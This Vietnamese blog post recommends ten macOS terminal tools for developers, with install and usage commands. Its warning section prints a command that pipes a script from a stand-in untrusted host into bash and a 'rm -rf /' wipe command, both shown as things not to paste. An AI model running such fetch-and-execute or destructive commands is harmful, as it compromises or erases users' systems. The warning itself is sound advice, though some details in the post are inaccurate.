+++
title = "Top 10 công cụ terminal cho Mac 2026: dev toolkit"
date = 2026-06-22
aliases = ["/top-10-cong-cu-terminal-mac-2026/"]
description = "Top 10 công cụ terminal cho Mac 2026: Homebrew, gh, jq, ripgrep, fzf, bat, eza, zoxide, lazygit, Phoenix Code."
slug = "top-10-cong-cu-terminal-mac-2026"

[taxonomies]
categories = ["Tất cả", "Công nghệ"]
tags = ["terminal", "mac", "dev tools", "productivity", "cli", "homebrew", "workflow"]
[extra]
thumbnail = "https://picsum.photos/seed/terminal-mac-tools/600/400"
seo_keyword = "công cụ terminal cho Mac"
featured = false
+++

Nếu bạn là dev trên Mac, terminal mặc định (`bash`/`zsh`) sẽ đủ để làm việc cơ bản — nhưng **công cụ terminal cho Mac** chuyên biệt sẽ giúp bạn:

- 🚀 Làm việc **nhanh hơn 10 lần** (autocomplete, search, preview).
- 🎨 Đọc code, log, JSON **dễ hơn** (syntax highlight, format).
- 📁 Navigate folder **mượt mà** (jump, search, history).
- 🛠️ Debug, commit, deploy **an toàn hơn** (visual tool, confirmation).

Bài này giới thiệu **top 10 công cụ terminal Mac** mà mình đã dùng và recommend cho mọi dev — từ junior tới senior. Mỗi tool đều có mục đích rõ, có thể cài trong 2 phút, và giúp ích ngay.

<!-- more -->

## Tại sao nên cài công cụ terminal cho Mac?

**Bạn đang dùng terminal mặc định?** Thì bạn đang bỏ lỡ nhiều tiện ích:

- ❌ File command `ls` cơ bản, chậm, khó đọc.
- ❌ Search history bằng `Ctrl+R` — tìm được mới lạ.
- ❌ `grep` tìm trong file — mất công, nếu lỗi syntax còn khó hơn.
- ❌ `cat` file JSON — toàn khối text, không highlight.
- ❌ Git commit / revert — dễ thao tác sai, không preview.

Với **công cụ terminal cho Mac chuyên biệt**, bạn sẽ:

✅ Gõ tên file → **fuzzy search autocomplete** tự động.

✅ Xem folder structure **trực quan**, file icon, size, git status.

✅ Tìm string trong repo **realtime**, highlight, jump.

✅ Xem JSON/log **pretty-print**, đôi khi ngay **trong terminal**.

✅ Git blame, revert, diff **visual**, confirmation trước khi làm hỏng.

---

## Top 10 công cụ terminal Mac 2026

### 1. Homebrew — Package manager bắt buộc

**Mục đích:** Cài đặt, update, quản lý tool từ terminal.

**Vì sao hữu ích:** Thay vì tải `.dmg` hoặc `brew` từng tool, `Homebrew` là kho chứa 10,000+ package — cài 1 dòng, update 1 dòng, xoá 1 dòng.

**Cài đặt:**

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

**Ví dụ:**

```bash
brew install gh          # Cài GitHub CLI
brew install jq          # Cài jq (parse JSON)
brew upgrade             # Update tất cả package
brew list                # Danh sách đã cài
brew uninstall gh        # Xoá package
```

---

### 2. GitHub CLI (`gh`) — Quản lý GitHub từ terminal

**Mục đích:** Check PR, CI/CD, merge, tạo issue — không cần mở browser.

**Vì sao hữu ích:** Nếu bạn đang viết code hay debug, việc phải mở browser để check PR status là ngắt khoảng (context switch). `gh` để bạn check và hành động trong terminal.

**Cài đặt:**

```bash
brew install gh
gh auth login
```

**Ví dụ:**

```bash
gh pr status              # Xem PR của bạn
gh pr checks 123 --watch  # Đợi CI xong realtime
gh pr view 123            # Chi tiết PR
gh run list               # Workflow run gần nhất
gh issue list             # Danh sách issue
```

**Liên quan:** Xem bài [lệnh terminal kiểm tra PR GitHub](/posting/cac-lenh-terminal-kiem-tra-pr-github/) để biết chi tiết.

---

### 3. jq — Parse & format JSON

**Mục đích:** Lọc, chọn field, pretty-print JSON từ terminal.

**Vì sao hữu ích:** Khi bạn `curl` API hoặc `cat` file JSON, kết quả là khối text xấu. `jq` giúp bạn:
- Chọn field: `.user.name`
- Lọc array: `.items[] | select(.status=="active")`
- Pretty-print: `jq '.'`

**Cài đặt:**

```bash
brew install jq
```

**Ví dụ:**

```bash
# Pretty-print JSON
curl https://api.example.com/users | jq '.'

# Chọn field cụ thể
jq '.[] | .name' users.json

# Lọc theo điều kiện
jq '.items[] | select(.status=="active")' data.json
```

---

### 4. ripgrep (`rg`) — Tìm kiếm code siêu nhanh

**Mục đích:** Tìm string, regex trong codebase — nhanh hơn `grep` 100 lần.

**Vì sao hữu ích:** `grep` là lệnh cũ, chậm. `rg` là thay thế hiện đại:
- Tìm **nhanh** (bỏ qua `.git`, `node_modules`).
- Highlight **kết quả** màu sắc.
- `--type` filter theo loại file (Python, JS, Rust…).
- Preview context xung quanh kết quả.

**Cài đặt:**

```bash
brew install ripgrep
```

**Ví dụ:**

```bash
rg "todo" --type py         # Tìm "todo" trong file Python
rg "async/await" -A 3       # Tìm + in 3 dòng sau
rg "console\.log"           # Tìm console.log (escape special char)
rg "import.*os" --type py   # Regex trong Python file
```

---

### 5. fzf — Fuzzy finder: search & autocomplete

**Mục đích:** Tìm file, folder, command history bằng fuzzy search (không cần gõ chính xác).

**Vì sao hữu ích:** 
- Gõ `**<Tab>` → fuzzy search file.
- `Ctrl+R` → fuzzy search command history.
- Preview file trong khi search.
- Kết hợp `pipe` để filter đầu vào.

**Cài đặt:**

```bash
brew install fzf
# Chạy setup (thêm keybindings)
$(brew --prefix)/opt/fzf/install
```

**Ví dụ:**

```bash
# Tìm file
cd **/some<TAB>   # Fuzzy search folder có "some"

# Search command history
<Ctrl+R>          # Fuzzy search lệnh vừa chạy

# Combine với command khác
find . -type f | fzf    # Browse và chọn file
```

---

### 6. bat — Xem file với syntax highlight

**Mục đích:** Thay thế `cat` — thêm syntax highlight, line number, git diff.

**Vì sao hữu ích:** `cat file.py` output chữ plain. `bat` highlight Python syntax, show line number, highlight git changes.

**Cài đặt:**

```bash
brew install bat
```

**Ví dụ:**

```bash
bat file.py                # Xem Python file (highlight)
bat --line-range 10:20 big.log   # Xem dòng 10-20
bat --theme "Monokai Extended" file.md   # Chọn theme
```

---

### 7. eza — List file hiện đại (thay `ls`)

**Mục đích:** Lệnh `ls` mới, hiển thị file với icon, tree, git status.

**Vì sao hữu ích:**
- `ls` cơ bản chỉ show tên.
- `eza` show icon (file, folder, symlink), size, permission, **git status** (modified, new, untracked).
- Tree view folder structure.
- Color-coded theo loại file.

**Cài đặt:**

```bash
brew install eza
# Optional: alias
echo "alias ls='eza'" >> ~/.zshrc
```

**Ví dụ:**

```bash
eza -la                    # List với permission, git status
eza --tree --level=2       # Tree view 2 level
eza -lh --git              # Long format + git status
```

---

### 8. zoxide — Jump folder nhanh (thay `cd`)

**Mục đích:** Nhớ folder hay dùng, jump 1 lệnh (không cần path dài).

**Vì sao hữu ích:** Bạn có thêm 10 project, mỗi cái 3 level folder nested. Thay vì `cd /path/to/project/sub/folder`, bạn chỉ gõ `z projec` → jump ngay.

**Cài đặt:**

```bash
brew install zoxide
# Thêm vào ~/.zshrc (hoặc ~/.bashrc)
eval "$(zoxide init zsh)"
```

**Ví dụ:**

```bash
cd /very/long/path/to/project   # Lần đầu, zoxide học
z proj                          # Lần sau, jump ngay (fuzzy match)
zi                              # Interactive browse history
```

---

### 9. lazygit — Git GUI trong terminal

**Mục đích:** Xem git status, stage, commit, revert — visual, safe (có confirmation).

**Vì sao hữu ích:**
- Git CLI dễ sai lệnh, especially `rebase`, `reset --hard`.
- `lazygit` show **visual diff**, **branch tree**, **commit log** — dễ hiểu.
- Stage file bằng space, commit bằng `c`, preview trước hành động.
- Undo mistake bằng `z` (redo).

**Cài đặt:**

```bash
brew install lazygit
```

**Ví dụ:**

```bash
lazygit                    # Mở TUI Git
# Navigate: ↑↓ = branch, commit; ← → = pane (status/diff/log)
# Action: Space = stage, c = commit, r = rebase, u = undo
```

---

### 10. Phoenix Code — Code editor + AI cho Mac

**Mục đích:** Edit Markdown, fix code, refactor — với context visual/runtime.

**Vì sao hữu ích:**
- Lightweight editor (không VS Code heavyweight).
- **AI-assisted editing** — ask Claude để rewrite paragraph, fix code.
- **Visual preview** — Markdown preview realtime, website preview (nếu `zola build` hoặc `npm start`).
- **Context-aware** — hiểu project structure, file dependencies.
- Phù hợp cho **content creator**, **tech blogger** — edit `.md` files với AI helper.

**Cài đặt:**

Mac version tại [Phoenix Code](https://phoenixcode.com/) — hoặc qua Homebrew nếu available.

**Ví dụ:**

```bash
# Mở file trong Phoenix Code
open -a "Phoenix Code" blog.md

# Highlight text → Ask Claude "make it shorter"
# Markdown auto-preview on the right
# Run Zola build → live preview
```

---

## Bonus: Starship — Shell prompt siêu đẹp

**Mục đích:** Customize shell prompt (thay `$` hoặc `% `).

**Vì sao hữu ích:** Prompt mặc định chỉ show folder hiện tại. Starship show:
- Git branch hiện tại + status (modified ✗, untracked ?).
- Language version (Python 3.11, Node 18…).
- Command exit code (nếu error, show 🔴).
- Execution time (lệnh mất bao lâu).

**Cài đặt:**

```bash
brew install starship
echo 'eval "$(starship init zsh)"' >> ~/.zshrc
# Reload shell
source ~/.zshrc
```

---

## Bảng so sánh nhanh

| Tool | Thay thế | Ưu điểm | Học 5 phút |
|------|----------|---------|-----------|
| **Homebrew** | Manual download | Cài 1 dòng, manage dễ | `brew install <pkg>` |
| **gh** | GitHub.com | Không mở browser | `gh pr status` |
| **jq** | grep + awk | Pretty-print JSON, filter | `jq '.field'` |
| **rg** | grep | Nhanh, skip `.git` | `rg "string"` |
| **fzf** | Gõ path đầy đủ | Fuzzy search, visual | `<Ctrl+R>` history |
| **bat** | cat | Syntax highlight | `bat file.py` |
| **eza** | ls | Icon, git status, tree | `eza -la` |
| **zoxide** | cd /long/path | Jump folder hay dùng | `z proj` |
| **lazygit** | git command | Visual diff, safe | `lazygit` |
| **Phoenix Code** | VS Code | Lightweight + AI | Open & edit `.md` |

---

## ⚠️ Cảnh báo: Đừng paste lệnh lạ vào terminal

Khi bạn tìm kiếm "cách fix bug" trên Google hay ChatGPT, bạn sẽ gặp các terminal command. **Quy tắc bắt buộc:**

🔴 **KHÔNG paste lệnh nếu bạn:**
- Không hiểu nó làm gì.
- Nó chứa `rm -rf /`, `curl | bash`, `sudo`.
- Nguồn không đáng tin (random blog, diễn đàn cũ).

✅ **HÃNG paste nếu:**
- Bạn đã **đọc và hiểu** từng từ.
- Nó từ **tài liệu chính thức** (Apple, Homebrew, GitHub docs).
- Bạn **backup data trước** (git commit, file backup).
- Bạn **test trên local** trước khi dùng production.

**Ví dụ nguy hiểm:**
```bash
# ❌ KHÔNG PASTE NÀY — nó xoá folder!
curl https://shady-site.com/script.sh | bash

# ❌ KHÔNG PASTE — xoá tất cả file
rm -rf /
```

---

## FAQ

**Q: Mình là dev Python/Node/Ruby — nên cài tool nào?**

A: Cài hết top 5: Homebrew, gh, jq, rg, fzf, bat. Đó là **bộ cơ bản** ai cũng dùng. eza + zoxide tuỳ sở thích.

**Q: Cài nhiều tool, sẽ lag terminal không?**

A: Không. Mỗi tool ~5-20 MB, modern Mac có GB RAM. Chỉ lag nếu bạn chạy heavy process (video encode, AI training).

**Q: Làm sao biết command của tool mới?**

A: Gõ `<tool-name> --help` hoặc `<tool-name> -h`. Hầu hết tool hiện help. Hoặc `man <tool-name>` (manual page).

**Q: Uninstall tool được không?**

A: Dễ: `brew uninstall <tool-name>`. Config file giữ lại, nếu cài lại sẽ dùng lại.

**Q: Có tool nào cho Git mà an toàn hơn CLI?**

A: `lazygit` + `gh` kết hợp. `lazygit` visual, `gh` cho PR/issue. Cùng lại: không bỏ sót hành động.

**Q: Phoenix Code có bản Windows/Linux không?**

A: Bài này focus **Mac** vì đó là nền tảng phổ biến dev. Windows → try VS Code / Windows Terminal. Linux → try VS Code / Neovim.

---

## Kết luận

Nếu bạn mới bắt đầu với terminal trên Mac, đừng overwhelmed — chỉ cần:

1. **Tuần 1:** Cài Homebrew → `gh` → `fzf`.
2. **Tuần 2:** Thêm `rg` + `bat`.
3. **Tuần 3+:** Dần dần thêm eza, zoxide, lazygit.

Mỗi tool sẽ tiết kiệm 5-10 giây mỗi lần dùng. Nhân 100 lần/ngày → **500-1000 giây = 10-15 phút/ngày tiết kiệm**. Tính năm, đó là **60+ giờ làm việc lại**.

Hôm nay, hãy cài Homebrew + `gh` — bạn sẽ thấy chênh lệch ngay. 🚀

**Tham khảo:**
- [Homebrew Official](https://brew.sh/)
- [GitHub CLI Manual](https://cli.github.com/manual/)
- [fzf GitHub](https://github.com/junegunn/fzf)
- [ripgrep GitHub](https://github.com/BurntSushi/ripgrep)
